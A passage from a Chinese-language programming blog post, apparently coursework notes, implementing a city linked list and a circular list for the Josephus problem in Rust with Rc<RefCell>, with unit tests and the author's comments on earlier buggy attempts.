<span class="token operator">=</span> current <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> next <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> next<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>city_name <span class="token operator">==</span> name<span class="token punctuation">&#123;</span>            node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next <span class="token operator">=</span> next<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            current <span class="token operator">=</span> next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>以上代码写得一点都不锈，不仅到处是红红的报错，而且用到了unwrap，这意味着如果值为None会直接panic，同时实际上跳过了first节点的检查</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">remove_with_name</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> current <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">None</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>city_name <span class="token operator">==</span> name <span class="token punctuation">&#123;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>first <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 删除头结点</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> next <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>next_node<span class="token punctuation">)</span> <span class="token operator">=</span> next <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> name <span class="token operator">==</span> next_node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>city_name<span class="token punctuation">&#123;</span>                node<span class="token punctuation">.</span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next <span class="token operator">=</span> next_node<span class="token punctuation">.</span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                current <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[test]</span><span class="token keyword">fn</span> <span class="token function-definition function">test_remove_with_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> head <span class="token operator">=</span> <span class="token class-name">Head</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4.0</span><span class="token punctuation">,</span><span class="token number">4.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"xianggang"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10.0</span><span class="token punctuation">,</span><span class="token number">10.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token punctuation">.</span><span class="token function">remove_with_name</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token punctuation">.</span><span class="token function">remove_with_name</span><span class="token punctuation">(</span><span class="token string">"xianggang"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span><span class="token function">find_with_name</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span><span class="token function">find_with_name</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">4.0</span><span class="token punctuation">,</span> <span class="token number">4.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span><span class="token function">find_with_name</span><span class="token punctuation">(</span><span class="token string">"xianggang"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一版至少可以顺利通过测试了</p><p>最后一部分，根据name修改坐标：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">update_with_name</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span> p_x<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span> p_y<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> name <span class="token operator">==</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>city_name<span class="token punctuation">&#123;</span>            node<span class="token punctuation">.</span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>p_x <span class="token operator">=</span> p_x<span class="token punctuation">;</span>            node<span class="token punctuation">.</span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>p_y <span class="token operator">=</span> p_y<span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            current <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[test]</span><span class="token keyword">fn</span> <span class="token function-definition function">test_update_with_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> head <span class="token operator">=</span> <span class="token class-name">Head</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4.0</span><span class="token punctuation">,</span><span class="token number">4.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token punctuation">.</span><span class="token function">update_with_name</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span><span class="token function">find_with_name</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">,</span> <span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="实验二：约瑟夫环"><a href="#实验二：约瑟夫环" class="headerlink" title="实验二：约瑟夫环"></a>实验二：约瑟夫环</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">[问题描述约瑟夫(Joseph)问题的一种描述是:编号为 1、2、…、n的n个人按顺时针方向围坐一圈，每人持有一个密码(正整数)。一开始任选一个正整数作为报数上限值 m，从第1个人开始按顺时针方向自1开始顺序报数，报到m时停止报数。报m 的人出列，将 TA 的密码作为新的 m 值，从 TA在顺时针方向上的下一个人开始重新从1报数，如此下去，直至所有人全部出列为止。试设计一个程序求出出列顺序。[基本要求]利用单向循环链表存储结构模拟此过程，按照出列的顺序打印出各人的编号[测试数据]m 的初值为 20:密码:3，1，7，2，4，8，4(正确的结果应为6，1，4，7，2，3，5)[实现提示]程序运行后首先要求用户指定初始报数上限值，然后读取各人的密码。设n≤30。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>依旧是先定义链表结构：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">type</span> <span class="token type-definition class-name">Link</span> <span class="token operator">=</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Rc</span><span class="token operator">&lt;</span><span class="token class-name">RefCell</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span><span class="token operator">></span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Node</span><span class="token punctuation">&#123;</span>    index <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>    key <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>    next<span class="token punctuation">:</span> <span class="token class-name">Link</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>index记录编号（可省略），key记录密码</p><p>循环链表就需要循环引用，在rust里并不是一件容易实现的事，比如直接来：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span>num <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> new_node <span class="token operator">=</span> <span class="token class-name">Node</span><span class="token punctuation">&#123;</span>index <span class="token punctuation">:</span> num<span class="token punctuation">,</span> key <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> next<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    new_node<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token class-name">Option</span><span class="token punctuation">::</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Rc</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">RefCell</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    new_node<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>new_node的所有权已经转移到了next字段，怎么还能返回呢？利用智能指针的封装可以避免这个问题，同时为了后续操作方便，增加一个头节点，保留循环链表的尾指针：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>rc<span class="token punctuation">::</span></span><span class="token class-name">Rc</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>cell<span class="token punctuation">::</span></span><span class="token class-name">RefCell</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Node</span> <span class="token punctuation">&#123;</span>    index <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>    key <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>    next<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Rc</span><span class="token operator">&lt;</span><span class="token class-name">RefCell</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span><span class="token operator">></span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token type-definition class-name">CircularList</span> <span class="token punctuation">&#123;</span>    len <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>    tail<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Rc</span><span class="token operator">&lt;</span><span class="token class-name">RefCell</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span><span class="token operator">></span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">CircularList</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">Self</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">CircularList</span> <span class="token punctuation">&#123;</span>            len <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>            tail<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 创建单节点循环链表</span>    <span class="token keyword">fn</span> <span class="token function-definition function">new_single_node</span><span class="token punctuation">(</span>key<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">Self</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> node <span class="token operator">=</span> <span class="token class-name">Rc</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">RefCell</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>            index<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>            key<span class="token punctuation">,</span>            next<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 关键：让节点的 next 指向自己</span>        node<span class="token punctuation">.</span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">CircularList</span> <span class="token punctuation">&#123;</span>            len <span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>            tail<span class="token punctuation">:</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 遍历链表</span>    <span class="token keyword">fn</span> <span class="token function-definition function">traverse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>tail <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> head<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">loop</span> <span class="token punctuation">&#123;</span>                <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Data: &#123;&#125;"</span><span class="token punctuation">,</span> current<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">let</span> next <span class="token operator">=</span> current<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                current <span class="token operator">=</span> next<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[cfg(test)]</span><span class="token keyword">mod</span> <span class="token module-declaration namespace">tests</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token keyword">crate</span><span class="token punctuation">::</span><span class="token class-name">CircularList</span><span class="token punctuation">;</span>    <span class="token attribute attr-name">#[test]</span>    <span class="token keyword">fn</span> <span class="token function-definition function">test_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> list <span class="token operator">=</span> <span class="token class-name">CircularList</span><span class="token punctuation">::</span><span class="token function">new_single_node</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 遍历链表</span>        list<span class="token punctuation">.</span><span class="token function">traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出死循环的1</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>接下来实现push操作：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">push_back</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> key<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> new_node <span class="token operator">=</span> <span class="token class-name">Rc</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">RefCell</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>        index <span class="token punctuation">:</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len<span class="token punctuation">,</span>        key<span class="token punctuation">,</span>        next<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">match</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>tail <span class="token punctuation">&#123;</span>        <span class="token class-name">None</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token macro property">panic!</span><span class="token punctuation">(</span><span class="token string">"should new_single_node() first"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">Some</span><span class="token punctuation">(</span>tail<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> head <span class="token operator">=</span> tail<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            new_node<span class="token punctuation">.</span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>            tail<span class="token punctuation">.</span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>new_node<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>tail <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[test]</span><span class="token keyword">fn</span> <span class="token function-definition function">test_push_back</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> list <span class="token operator">=</span> <span class="token class-name">CircularList</span><span class="token punctuation">::</span><span class="token function">new_single_node</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 